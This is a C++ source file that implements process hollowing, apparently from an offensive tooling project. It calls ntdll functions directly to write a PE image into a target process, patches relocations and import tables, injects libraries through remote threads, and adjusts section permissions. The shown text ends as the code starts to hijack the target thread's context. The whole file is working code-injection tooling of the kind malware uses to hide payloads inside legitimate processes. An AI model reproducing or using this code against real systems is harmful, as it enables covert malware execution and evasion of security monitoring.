// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "ProcessHollowingPE.h"
#include <tlhelp32.h>
#include <psapi.h>

#define SIZE_CHUNK 9000


_NtWriteVirtualMemory myNtWrite = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
_NtProtectVirtualMemory myNtProtec = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
_NtAllocateVirtualMemory myNtAlloc = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
_NtCreateThreadEx myNtThread = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
_NtResumeThread myNtResumeThread = (_NtResumeThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtResumeThread");
_NtWaitForSingleObject myNtWaitForSingleObject = (_NtWaitForSingleObject)GetProcAddress(GetModuleHandleA("ntdll"), "NtWaitForSingleObject");
_NtGetContextThread myNtGetContextThread = (_NtGetContextThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtGetContextThread");
_NtSetContextThread myNtSetContextThread = (_NtSetContextThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetContextThread");



bool copyPEinTargetProcess(HANDLE pHandle, LPVOID allocAddrOnTarget, PPE_STRUCT myPE)
{

	myPE->ntHeader->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
	NTSTATUS status = 0;
	/*
	_dbg("[+] Writing Header into target process\r\n");
	status = myNtWrite(pHandle, allocAddrOnTarget, myPE->imageBase, myPE->ntHeader->OptionalHeader.SizeOfHeaders, NULL);
	if (status != 0)
	{
		_err("[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x\r\n", status);
		return FALSE;
	}
	_dbg("\t[+] Headers written at : 0x%p\n", allocAddrOnTarget);
	*/
	_dbg("[+] Writing section into target process\r\n");
	for (int i = 0; i < myPE->ntHeader->FileHeader.NumberOfSections; i++)
	{
		if (!strcmp((PCHAR)myPE->sections[i].header->Name, ".reloc"))
			continue;
		DWORD numChunks = (myPE->sections[i].header->SizeOfRawData + SIZE_CHUNK - 1) / SIZE_CHUNK;
		for (int chunkNum = 0; chunkNum < numChunks; chunkNum++)
		{
			SIZE_T byteWritten = 0;
			DWORD sizeToWrite = SIZE_CHUNK;
			if (chunkNum == (numChunks - 1))
			{
				sizeToWrite = myPE->sections[i].header->SizeOfRawData % SIZE_CHUNK;
			}
			status = myNtWrite(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + myPE->sections[i].header->VirtualAddress + (SIZE_CHUNK*chunkNum)), (PVOID)((PBYTE)myPE->sections[i].addrSection+(SIZE_CHUNK * chunkNum)), sizeToWrite, &byteWritten);
			if (status != 0)
			{
				_err("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)myPE->sections[i].header->Name, status);
				return FALSE;
			}
			_dbg("\t[+] Section %s written at : 0x%p.\n", (LPSTR)myPE->sections[i].header->Name, (LPVOID)((UINT64)allocAddrOnTarget + myPE->sections[i].header->VirtualAddress));
		}


	}
	return TRUE;
}

bool fixRelocTable(HANDLE pHandle, PPE_STRUCT myPE, PVOID allocAddrOnTarget, DWORD64 DeltaImageBase)
{
	_dbg("[+] Fixing relocation table.\n");
	PPE_SECTION relocSection = getSection(myPE, (PCHAR)".reloc");
	if (relocSection == nullptr)
	{
		_dbg("No Reloc Table\r\n");
		return TRUE;
	}

	DWORD RelocOffset = 0;
	while (RelocOffset < myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
	{
		PIMAGE_BASE_RELOCATION currentReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)myPE->imageBase + relocSection->header->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (currentReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		_dbg("[*] Number of relocation: %d\r\n", NumberOfEntries);

		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			PBASE_RELOCATION_ENTRY currentRelocEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)relocSection->addrSection + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (currentRelocEntry->Type == 0)
				continue;

			DWORD64 AddressLocation = (DWORD64)allocAddrOnTarget + currentReloc->VirtualAddress + currentRelocEntry->Offset;

			PDWORD64 PatchedAddress = (PDWORD64)((PBYTE)myPE->imageBase + currentReloc->VirtualAddress + currentRelocEntry->Offset);
			PatchedAddress = (PDWORD64)((PBYTE)PatchedAddress - getOffsetFromAddr(myPE, PatchedAddress));

			_dbg("\t[+] Address To Patch: %p -> Address Patched: %p \r\n", (PVOID)*PatchedAddress, (PVOID)(*PatchedAddress + DeltaImageBase));

			*PatchedAddress += DeltaImageBase;

			NTSTATUS status = myNtWrite(pHandle, (LPVOID)AddressLocation, PatchedAddress, sizeof(DWORD64), nullptr);
			if (status != 0)
			{
				_err("[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
				return FALSE;
			}
		}
	}
	return TRUE;
}


BOOL resolveAPISet(PWCHAR apiToResolve, PWCHAR& apiResolved)
{
	PPEB peb = (PPEB)__readgsqword(0x60);
	PAPI_SET_NAMESPACE apiMap = (PAPI_SET_NAMESPACE)peb->Reserved9[0];
	PWSTR ApiStrName = nullptr;
	PAPI_SET_NAMESPACE_ENTRY ApiMapEntry = PAPI_SET_NAMESPACE_ENTRY(apiMap->EntryOffset + (PBYTE)apiMap);
	for (int i = 0; i < apiMap->Count; ++i)
	{
		int len = lstrlenW(apiToResolve) * 2 - 5 * 2;
		ApiStrName = (PWSTR)((PBYTE)apiMap + ApiMapEntry->NameOffset);
		if (!memcmp(ApiStrName, apiToResolve, len))
		{
			PAPI_SET_VALUE_ENTRY ApiValueEntry = (PAPI_SET_VALUE_ENTRY)((PBYTE)apiMap + ApiMapEntry->ValueOffset);
			apiResolved = (PWCHAR)LocalAlloc(LPTR, ApiValueEntry->ValueLength + 2);
			memcpy(apiResolved, (PWSTR)((PBYTE)apiMap + ApiValueEntry->ValueOffset), ApiValueEntry->ValueLength);

			_dbg("ApiSetName: %ws -> ApiResolved: %ws \r\n", apiToResolve, apiResolved);
			return TRUE;
		}
		ApiMapEntry++;
	}
	_err("Error in resolving API Set name: %ws \r\n", apiToResolve);
	return FALSE;

}

HANDLE getSnapShotProcess(int pid) {

	HANDLE mod;

	mod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
	if (mod == INVALID_HANDLE_VALUE) {
		_err("CreateToolhelp32Snapshot error %x\r\n", GetLastError());
		return nullptr;
	}

	return mod;
}

MODULEENTRY32W getModuleEntry(HANDLE snapShotHandle, PWSTR moduleSearched)
{
	MODULEENTRY32 me32;
	me32.dwSize = sizeof(MODULEENTRY32);
	if (!Module32First(snapShotHandle, &me32)) {
		return { 0 };
	}
	do {
		if (!lstrcmpiW(me32.szModule, moduleSearched))
		{
			return me32;
		}
	} while (Module32NextW(snapShotHandle, &me32));
	return { 0 };
}

PVOID getAddrFunction(HMODULE lib, PCHAR functionName, PCHAR& forwardedLib, PCHAR& forwardedName)
{
	DWORD forwardSize = 0;
	DWORD forwardOffset = 0;
	CHAR forwardName[MAX_PATH] = { 0 };

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lib;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lib + dosHeader->e_lfanew);
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	SIZE_T exportDirectorySize = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)lib + exportDirectoryRVA);
	PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)lib + imageExportDirectory->AddressOfFunctions);

	// Recuperation du tableau des noms des fonctions exportees
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)lib + imageExportDirectory->AddressOfNames);

	// Recuperation de l'ordinal des fonctions exportees
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)lib + imageExportDirectory->AddressOfNameOrdinals);

	// Recuperation des tableaux de fonctions exportees
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		PSTR name = (PSTR)((PBYTE)lib + addressOfNamesRVA[i]);
		WORD ordinalName = (WORD)((PBYTE)lib + addressOfNameOrdinalsRVA[i]);
		PVOID addr = (PVOID)((PBYTE)lib + addressOfFunctionsRVA[ordinalName]);
		if (!strcmp(functionName, name))
		{
			if ((UINT_PTR)addr >= (UINT_PTR)imageExportDirectory && (UINT_PTR)addr < (UINT_PTR)imageExportDirectory + exportDirectorySize)
			{
				forwardSize = strlen((PCHAR)addr);
				memcpy(forwardName, (PCHAR)addr, forwardSize);

				// The forwardName has a format of DLLNAME.FunctionName so we split with '.'
				for (forwardOffset = 0; forwardOffset < forwardSize; forwardOffset++) {
					if (forwardName[forwardOffset] == '.') {
						forwardName[forwardOffset] = 0;
						break;
					}
				}
				if (!forwardedLib)
					forwardedLib = (PCHAR)LocalAlloc(LPTR, strlen(forwardName) + 1 + 4);
				else
					forwardedLib = (PCHAR)LocalReAlloc(forwardedLib, strlen(forwardName) + 1 + 4, LMEM_MOVEABLE | LMEM_ZEROINIT);

				forwardedLib[strlen(forwardName)] = '.';
				forwardedLib[strlen(forwardName) + 1] = 'd';
				forwardedLib[strlen(forwardName) + 2] = 'l';
				forwardedLib[strlen(forwardName) + 3] = 'l';

				if (!forwardedName)
					forwardedName = (PCHAR)LocalAlloc(LPTR, forwardSize - strlen(forwardName) + 1);
				else
					forwardedName = (PCHAR)LocalReAlloc(forwardedName, forwardSize - strlen(forwardName) + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
				memcpy(forwardedLib, forwardName, strlen(forwardName));
				memcpy(forwardedName, forwardName + forwardOffset + 1, forwardSize - strlen(forwardName));


				return getAddrFunction(LoadLibraryA(forwardedLib), forwardedName, forwardedLib, forwardedName);
			}
			return addr;
		}

	}
	return nullptr;
}

bool remoteLoadLibrary(HANDLE hProcess, PVOID libToLoad)
{
	PVOID loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	
	HANDLE hThread = nullptr;
	
	NTSTATUS status = myNtThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)loadlib, libToLoad, FALSE, 0, 0, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE or !hThread)
	{
		_err("Error in creating remote thread 0x%x\r\n", status);
		return FALSE;
	}
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}

bool remoteLoadLibrary(HANDLE hProcess, PCHAR libToLoad)
{
	PVOID addr = nullptr;
	SIZE_T sizeToAlloc = strlen(libToLoad) + 1;
	NTSTATUS status = myNtAlloc(hProcess, &addr, NULL, &sizeToAlloc , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!addr)
	{
		_err("Error allocating memory into process 0x%x\r\n", status);
		return FALSE;
	}
	status = myNtWrite(hProcess, addr, libToLoad, strlen(libToLoad) + 1, NULL);
	if (status != 0)
	{
		_err("Error in writing into process @0x%p -> 0x%x\r\n", addr, status);
		return FALSE;
	}
	
	PVOID loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	HANDLE hThread = nullptr;

	status = myNtThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)loadlib, addr, FALSE, 0, 0, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE or !hThread)
	{
		_err("Error in creating remote thread 0x%x\r\n", status);
		return FALSE;
	}
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}

bool loadImportTableLibs(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget)
{
	IMAGE_DATA_DIRECTORY importsDirectory = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importsDirectory.Size <= 20)
	{
		_dbg("[*] Empty IAT");
		return TRUE;
	}

	PPE_SECTION rdataSection = getSection(myPE, (PCHAR)".rdata");
	DWORD offsetRdata = rdataSection->header->VirtualAddress - rdataSection->header->PointerToRawData;
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)myPE->dataDirectories[IMAGE_DIRECTORY_ENTRY_IMPORT]- offsetRdata);


	_dbg("[*] Get Import Directory Table at %p\r\n", importDescriptor);


	LPSTR libName = NULL;
	HMODULE lib = NULL;

	while (importDescriptor->Name != NULL)
	{
		libName = (LPSTR)((PBYTE)myPE->imageBase + importDescriptor->Name - offsetRdata);

		_dbg("[*] library to load: %s\r\n", libName);

		if (!remoteLoadLibrary(hProcess, (PVOID)((PBYTE)allocAddrOnTarget + importDescriptor->Name)))
			return FALSE;

		lib = LoadLibraryA(libName);

		// Find forwarded functions

		if (lib)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((PBYTE)myPE->imageBase + importDescriptor->FirstThunk - offsetRdata);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)myPE->imageBase + thunk->u1.AddressOfData - offsetRdata);
					PCHAR forwardedLib = nullptr;
					PCHAR forwardedName = nullptr;
					PVOID addr = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					if (forwardedLib && forwardedName)
					{
						_dbg("Forwarded function found: %s. Need to import lib %s\r\n", functionName->Name, forwardedLib);
						if (!remoteLoadLibrary(hProcess, forwardedLib))
							return FALSE;

					}
				}
				thunk++;
			}
		}
		importDescriptor++;

	}
	return TRUE;
}

bool loadDelayedImportTableLibs(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget)
{

	IMAGE_DATA_DIRECTORY delayedImportsDirectory = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
	if (delayedImportsDirectory.VirtualAddress == 0)
		return TRUE;

	PPE_SECTION rdataSection = getSection(myPE, (PCHAR)".rdata");
	DWORD offsetRdata = rdataSection->header->VirtualAddress - rdataSection->header->PointerToRawData;

	PIMAGE_DELAYLOAD_DESCRIPTOR  delayedImportDescriptor = (PIMAGE_DELAYLOAD_DESCRIPTOR)((PBYTE)myPE->dataDirectories[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT] - offsetRdata);


	_dbg("[*] Get Delayed Import Directory Table at %p\r\n", delayedImportDescriptor);


	LPSTR libName = NULL;
	HMODULE lib = NULL;

	while (delayedImportDescriptor->DllNameRVA != NULL)
	{
		libName = (LPSTR)((PBYTE)myPE->imageBase + delayedImportDescriptor->DllNameRVA - offsetRdata);
		_dbg("[*] Delayed Import to load: %s\r\n", libName);

		if (!remoteLoadLibrary(hProcess, libName))
			return FALSE;

		lib = LoadLibraryA(libName);

		// Find forwarded functions

		if (lib)
		{
			PIMAGE_THUNK_DATA thunkName = NULL;
			thunkName = (PIMAGE_THUNK_DATA)((PBYTE)myPE->imageBase + delayedImportDescriptor->ImportNameTableRVA - offsetRdata);

			while (thunkName->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunkName->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunkName->u1.Ordinal);
					_dbg("\tFunction number %d to import\r\n", thunkName->u1.Ordinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)myPE->imageBase + thunkName->u1.AddressOfData - offsetRdata);
					PCHAR forwardedLib = nullptr;
					PCHAR forwardedName = nullptr;
					PVOID addr = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					if (forwardedLib && forwardedName)
					{
						_dbg("Forwarded function found: %s. Need to import lib %s\r\n", functionName->Name, forwardedLib);
						if (!remoteLoadLibrary(hProcess, forwardedLib))
							return FALSE;

					}
					_dbg("\tFunction %s to import\r\n", functionName->Name);
				}
				thunkName++;
			}
		}
		delayedImportDescriptor++;
	}

	return TRUE;
}

bool fixImports(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget, HANDLE mod)
{
	_dbg("[*] Fixing Import table\r\n");

	IMAGE_DATA_DIRECTORY importsDirectory = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importsDirectory.Size <= 20)
	{
		_dbg("[*] Empty IAT");
		return TRUE;
	}

	PPE_SECTION rdataSection = getSection(myPE, (PCHAR)".rdata");
	DWORD offsetRdata = rdataSection->header->VirtualAddress - rdataSection->header->PointerToRawData;
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)myPE->dataDirectories[IMAGE_DIRECTORY_ENTRY_IMPORT] - offsetRdata);

	HMODULE lib;


	while (importDescriptor->Name != NULL)
	{
		PWSTR moduleSearched = strToWstr((LPSTR)((PBYTE)myPE->imageBase + importDescriptor->Name - offsetRdata ));
		lib = LoadLibraryW(moduleSearched);
		if (!lib)
		{
			_err("Error in retrieving locally the lib %ws -> 0x%x\r\n", moduleSearched, GetLastError());
			return FALSE;
		}
		MODULEENTRY32W me32 = getModuleEntry(mod, moduleSearched);
		if (me32.modBaseAddr == 0)
		{
			PWSTR apiSetResolved = nullptr;
			resolveAPISet(moduleSearched, apiSetResolved);
			me32 = getModuleEntry(mod, apiSetResolved);
		}
		_dbg("Import found %ws -> %ws @ 0x%p \r\n", moduleSearched, me32.szModule, me32.modBaseAddr);
		if (me32.modBaseAddr != 0)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((PBYTE)myPE->imageBase + importDescriptor->FirstThunk - offsetRdata);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);

					PVOID remoteAddr = (PVOID)((PBYTE)(&thunk->u1.Function) + offsetRdata - (PBYTE)myPE->imageBase + (PBYTE)allocAddrOnTarget);
					PVOID localAddr = (PBYTE)GetProcAddress(lib, functionOrdinal);
					DWORD offset = (PBYTE)localAddr - (PBYTE)lib;
					ULONGLONG addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
					if (status != 0)
					{
						_err("Error in fixing address of function number %d -> 0x%x\r\n", thunk->u1.Ordinal, status);
						return FALSE;
					}


					_dbg("\t[*] Imported function number %d @ 0x%p\r\n", thunk->u1.Ordinal, addrFix);

				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)myPE->imageBase + thunk->u1.AddressOfData - offsetRdata);
					PVOID remoteAddr = (PVOID)((PBYTE)(&thunk->u1.Function) + offsetRdata - (PBYTE)myPE->imageBase + (PBYTE)allocAddrOnTarget);

					PCHAR forwardedName = nullptr;
					PCHAR forwardedLib = nullptr;

					PVOID addrFunc = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					DWORD offset = 0;
					ULONGLONG addrFix = 0;
					if (forwardedLib && forwardedName)
					{

						PWSTR forwardedLibWstr = strToWstr(forwardedLib);

						MODULEENTRY32W fwMe32 = getModuleEntry(mod, forwardedLibWstr);
						if (fwMe32.modBaseAddr == 0)
						{
							PWSTR apiSetResolved = nullptr;
							resolveAPISet(forwardedLibWstr, apiSetResolved);
							fwMe32 = getModuleEntry(mod, apiSetResolved);
							if (fwMe32.modBaseAddr == 0)
							{
								_err("Error in resolving the forwarded lib %ws\r\n", forwardedLibWstr);
								return FALSE;
							}
						}

						HMODULE fwLib = LoadLibraryA(forwardedLib);
						offset = (PBYTE)addrFunc - (PBYTE)fwLib;
						addrFix = (ULONGLONG)((PBYTE)fwMe32.modBaseAddr + offset);
						_dbg("[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p\r\n", functionName->Name, fwMe32.szModule, fwMe32.modBaseAddr);

					}
					else
					{
						offset = (PBYTE)addrFunc - (PBYTE)lib;
						addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
					}

					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
					if (status != 0)
					{
						_err("Error in fixing address of function %s -> 0x%x\r\n", functionName->Name, status);
						return FALSE;
					}


					_dbg("\t[*] Imported function %s @ 0x%p\r\n", functionName->Name, addrFix);

				}
				thunk++;
			}
		}
		importDescriptor++;
	}
	return TRUE;
}

bool fixDelayedImports(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget, HANDLE mod)
{

	_dbg("[*] Fixing Delayed Import table\r\n");
	HMODULE lib = nullptr;

	IMAGE_DATA_DIRECTORY delayedImportsDirectory = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
	if (delayedImportsDirectory.VirtualAddress == 0)
		return TRUE;

	PPE_SECTION rdataSection = getSection(myPE, (PCHAR)".rdata");
	DWORD offsetRdata = rdataSection->header->VirtualAddress - rdataSection->header->PointerToRawData;

	PIMAGE_DELAYLOAD_DESCRIPTOR  delayedImportDescriptor = (PIMAGE_DELAYLOAD_DESCRIPTOR)((PBYTE)myPE->dataDirectories[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT] - offsetRdata);


	while (delayedImportDescriptor->DllNameRVA != NULL)
	{
		PWSTR moduleSearched = strToWstr((LPSTR)((PBYTE)myPE->imageBase + delayedImportDescriptor->DllNameRVA - offsetRdata ));
		lib = LoadLibraryW(moduleSearched);
		if (!lib)
		{
			_err("Error in retrieving locally the lib %ws -> 0x%x\r\n", moduleSearched, GetLastError());
			return FALSE;
		}
		MODULEENTRY32W me32 = getModuleEntry(mod, moduleSearched);
		if (me32.modBaseAddr == 0)
		{
			PWSTR apiSetResolved = nullptr;
			resolveAPISet(moduleSearched, apiSetResolved);
			me32 = getModuleEntry(mod, apiSetResolved);
		}
		_dbg("Import found %ws -> %ws @ 0x%p \r\n", moduleSearched, me32.szModule, me32.modBaseAddr);
		if (me32.modBaseAddr != 0)
		{
			PIMAGE_THUNK_DATA thunkFct = NULL;
			PIMAGE_THUNK_DATA thunkName = NULL;
			thunkFct = (PIMAGE_THUNK_DATA)((PBYTE)myPE->imageBase + delayedImportDescriptor->ImportAddressTableRVA - offsetRdata);
			thunkName = (PIMAGE_THUNK_DATA)((PBYTE)myPE->imageBase + delayedImportDescriptor->ImportNameTableRVA - offsetRdata);

			while (thunkName->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunkName->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunkName->u1.Ordinal);

					PVOID remoteAddr = (PVOID)((PBYTE)(&thunkFct->u1.Function) + offsetRdata - (PBYTE)myPE->imageBase + (PBYTE)allocAddrOnTarget);
					PVOID localAddr = (PBYTE)GetProcAddress(lib, functionOrdinal);
					DWORD offset = (PBYTE)localAddr - (PBYTE)lib;
					ULONGLONG addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);

					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
					if (status != 0)
					{
						_err("Error in fixing address of function number %d -> 0x%x\r\n", thunkName->u1.Ordinal, status);
						return FALSE;
					}


					_dbg("\t[*] Imported function number %d @ 0x%p\r\n", thunkName->u1.Ordinal, addrFix);

				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)myPE->imageBase + thunkName->u1.AddressOfData - offsetRdata);
					PVOID remoteAddr = (PVOID)((PBYTE)(&thunkFct->u1.Function) + offsetRdata - (PBYTE)myPE->imageBase + (PBYTE)allocAddrOnTarget);

					PCHAR forwardedName = nullptr;
					PCHAR forwardedLib = nullptr;

					PVOID addrFunc = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					DWORD offset = 0;
					ULONGLONG addrFix = 0;
					if (forwardedLib && forwardedName)
					{

						PWSTR forwardedLibWstr = strToWstr(forwardedLib);

						MODULEENTRY32W fwMe32 = getModuleEntry(mod, forwardedLibWstr);
						if (fwMe32.modBaseAddr == 0)
						{
							PWSTR apiSetResolved = nullptr;
							resolveAPISet(forwardedLibWstr, apiSetResolved);
							fwMe32 = getModuleEntry(mod, apiSetResolved);
							if (fwMe32.modBaseAddr == 0)
							{
								_err("Error in resolving the forwarded lib %ws\r\n", forwardedLibWstr);
								return FALSE;
							}
						}

						HMODULE fwLib = LoadLibraryA(forwardedLib);
						offset = (PBYTE)addrFunc - (PBYTE)fwLib;
						addrFix = (ULONGLONG)((PBYTE)fwMe32.modBaseAddr + offset);
						_dbg("[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p\r\n", functionName->Name, fwMe32.szModule, fwMe32.modBaseAddr);

					}
					else
					{
						offset = (PBYTE)addrFunc - (PBYTE)lib;
						addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
					}

					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
					if (status != 0)
					{
						_err("Error in fixing address of function %s -> 0x%x\r\n", functionName->Name, GetLastError());
						return FALSE;
					}


					_dbg("\t[*] Imported function %s @ 0x%p\r\n", functionName->Name, addrFix);

				}
				thunkName++;
				thunkFct++;
			}
		}
		delayedImportDescriptor++;
	}

	return TRUE;

}

BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

	// Loop through each section of the PE image.
	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// Variables to store the new and old memory protections.
		DWORD	dwProtection = 0x00,
			dwOldProtection = 0x00;

		// Apply the determined memory protection to the section.
		PVOID addr = (PBYTE)pPeBaseAddress + pImgSecHdr[i].VirtualAddress;
		SIZE_T size = pImgSecHdr[i].SizeOfRawData;

		// Skip the section if it has no data or no associated virtual address.
		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		// Determine memory protection based on section characteristics.
		// These characteristics dictate whether the section is readable, writable, executable, etc.
		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
		{
			
			dwProtection = PAGE_READONLY;
			NTSTATUS status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
			if (status != 0) {
				_err("Failed changing permissions: %x\r\n", status);
				return FALSE;
			}
			dwProtection = PAGE_EXECUTE_READ;
			status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
			if (status != 0) {
				_err("Failed changing permissions: %x\r\n", status);
				return FALSE;
			}
			return TRUE;
		}
			

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;


		NTSTATUS status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
		if (status != 0) {
			_err("Failed changing permissions: %x\r\n",status);
			return FALSE;
		}
	}

	return TRUE;
}

BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myPE)
{
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	NTSTATUS status = myNtGetContextThread(pi->hThread, &CTX);
	if (status != 0)
	{
		_dbg("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

